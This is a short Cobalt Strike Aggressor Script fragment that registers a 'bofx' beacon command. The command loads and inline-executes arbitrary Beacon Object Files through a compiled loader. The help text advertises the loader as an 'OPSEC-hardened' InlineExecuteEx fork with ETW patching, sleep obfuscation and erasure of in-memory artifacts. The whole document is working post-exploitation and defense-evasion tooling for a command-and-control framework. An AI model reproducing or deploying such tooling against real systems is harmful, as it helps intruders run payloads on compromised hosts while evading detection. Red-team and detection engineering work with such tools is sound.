# --- bofx ---
alias bofx {
    local('$bid $bofpath $entry $bofargs $args');
    $bid     = $1;
    $bofpath = $2;
    $entry   = $3;
    $bofargs = $4;
    if ($bofpath is $null) {
        berror($bid, "Use: bofx <bof-path> [entry] [args]\nExample: bofx /tmp/mybof.x64.o go\nExample: bofx /tmp/mybof.x64.o go somearg");
        return;
    }
    if ($entry is $null)   { $entry   = "go"; }
    if ($bofargs is $null) { $bofargs = ""; }
    local('$xargs $xpath');
    $xargs = bof_pack($bid, "zzz", $bofpath, $entry, $bofargs);
    $xpath = script_resource("../dist/bofx.x64.o");
    if (!-exists $xpath) {
        berror($bid, "[dani-suite] bofx.x64.o not found at: " . $xpath);
        return;
    }
    bof_inline_execute($bid, $xpath, "go", $xargs);
}
beacon_command_register(
    "bofx",
    "OPSEC-hardened BOF loader (InlineExecuteEx fork) — Phase 6 (by Dani)",
    "Synopsis: bofx <bof-path> [entry] [args]\n\n" .
    "Description: Load and execute an arbitrary BOF using an OPSEC-hardened\n" .
    "InlineExecuteEx fork. Supports ETW patching, sleep obfuscation, and\n" .
    "cleanup of BOF artifacts from memory after execution.\n\n" .
    "Examples:\n" .
    "  bofx /tmp/custom.x64.o go\n" .
    "  bofx /tmp/custom.x64.o go someargument\n\n" .
    "Phase: 6 — Loader\nArgs: <bof-path> [entry=go] [args]"
);

